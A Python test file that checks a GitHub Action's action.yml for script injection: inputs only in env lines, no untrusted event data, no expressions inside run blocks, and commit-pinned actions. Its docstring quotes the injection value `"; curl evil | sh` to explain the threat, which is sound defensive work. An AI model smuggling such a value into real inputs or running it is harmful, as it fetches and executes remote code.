"""Safety checks on action.yml (text based, no yaml dependency).

Why: a value like  `"; curl evil | sh`  in an input must never become a command.
GitHub pastes ${{ ... }} into the script text BEFORE bash runs it, so the only
safe place for an input is an `env:` line; the script then reads "$VAR".
"""
import re
from pathlib import Path

TEXT = (Path(__file__).resolve().parent.parent / "action.yml").read_text(encoding="utf-8")
LINES = TEXT.splitlines()
EXPR = re.compile(r"\$\{\{\s*([^}]*?)\s*\}\}")


def test_inputs_only_in_env_assignments():
    for n, line in enumerate(LINES, 1):
        for expr in EXPR.findall(line):
            if expr.startswith("inputs."):
                assert re.match(r"^\s+[A-Z][A-Z0-9_]*: \$\{\{ inputs\.[a-z-]+ \}\}\s*$", line) \
                    or line.lstrip().startswith(("if:", "value:")), \
                    f"line {n}: input used outside an env assignment: {line.strip()}"


def test_no_untrusted_event_data():
    for bad in ("github.event", "github.head_ref", "github.event.pull_request"):
        assert bad not in TEXT


def test_script_never_pastes_expressions():
    # Inside `run: |` blocks there must be no ${{ }} at all (only env lines and if/with lines).
    in_run = False
    indent = 0
    for n, line in enumerate(LINES, 1):
        if re.match(r"^\s+run: \|\s*$", line):
            in_run, indent = True, len(line) - len(line.lstrip())
            continue
        if in_run:
            if line.strip() and (len(line) - len(line.lstrip())) <= indent:
                in_run = False
            elif EXPR.search(line):
                raise AssertionError(f"line {n}: expression inside a script: {line.strip()}")


def test_actions_are_pinned_to_commits():
    for line in LINES:
        m = re.search(r"uses: (\S+)@(\S+)", line)
        if m:
            assert re.fullmatch(r"[0-9a-f]{40}", m.group(2)), line
